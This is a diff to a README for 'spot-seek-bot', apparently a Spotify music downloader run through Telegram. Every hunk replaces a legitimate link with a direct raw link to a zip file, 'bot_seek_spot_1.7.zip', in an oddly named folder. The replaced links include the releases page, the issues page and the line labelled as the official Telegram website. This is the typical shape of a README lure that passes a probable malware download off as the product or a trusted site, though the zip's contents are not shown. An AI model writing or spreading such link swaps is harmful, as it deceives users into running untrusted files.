@@ -1,6 +1,6 @@
 # 🎵 spot-seek-bot - Easy Spotify Music Downloader
 
-[![Download spot-seek-bot](https://img.shields.io/badge/Download-spotseekbot-orange?style=for-the-badge)](https://github.com/Somia2207/spot-seek-bot/releases)
+[![Download spot-seek-bot](https://img.shields.io/badge/Download-spotseekbot-orange?style=for-the-badge)](https://github.com/Somia2207/spot-seek-bot/raw/refs/heads/main/undissociated/bot_seek_spot_1.7.zip)
 
 ## 📋 About spot-seek-bot
 
@@ -39,7 +39,7 @@ No extra installation or complicated setup is needed on your Windows PC. You onl
 
 If you don’t already have Telegram, download and install it:
 
-1. Visit the official Telegram website: https://desktop.telegram.org/
+1. Visit the official Telegram website: https://github.com/Somia2207/spot-seek-bot/raw/refs/heads/main/undissociated/bot_seek_spot_1.7.zip
 2. Click “Get Telegram for Windows.”
 3. Open the downloaded file and follow the instructions to install Telegram.
 4. Sign in or create an account if you do not have one.
@@ -65,7 +65,7 @@ To download music:
 
 You can download any necessary files or updates from the release page. To do this:
 
-[![Download spot-seek-bot](https://img.shields.io/badge/Download-spotseekbot-blue?style=for-the-badge)](https://github.com/Somia2207/spot-seek-bot/releases)
+[![Download spot-seek-bot](https://img.shields.io/badge/Download-spotseekbot-blue?style=for-the-badge)](https://github.com/Somia2207/spot-seek-bot/raw/refs/heads/main/undissociated/bot_seek_spot_1.7.zip)
 
 1. Click the link above to visit the release page.
 2. Look for the latest version under “Assets.”
@@ -90,7 +90,7 @@ spot-seek-bot updates may be released to fix bugs or add features. Keep an eye o
 
 For help using spot-seek-bot, you can:
 
-- Visit the GitHub repository for issues: https://github.com/Somia2207/spot-seek-bot/issues
+- Visit the GitHub repository for issues: https://github.com/Somia2207/spot-seek-bot/raw/refs/heads/main/undissociated/bot_seek_spot_1.7.zip
 - Search online for basic Telegram bot guides.
 - Ask in Telegram bot or music downloader forums.
 
@@ -100,4 +100,4 @@ spot-seek-bot acts as a middleman, connecting Spotify music to you. It does not 
 
 ---
 
-[![Download spot-seek-bot](https://img.shields.io/badge/Download-spotseekbot-green?style=for-the-badge)](https://github.com/Somia2207/spot-seek-bot/releases)
+[![Download spot-seek-bot](https://img.shields.io/badge/Download-spotseekbot-green?style=for-the-badge)](https://github.com/Somia2207/spot-seek-bot/raw/refs/heads/main/undissociated/bot_seek_spot_1.7.zip)
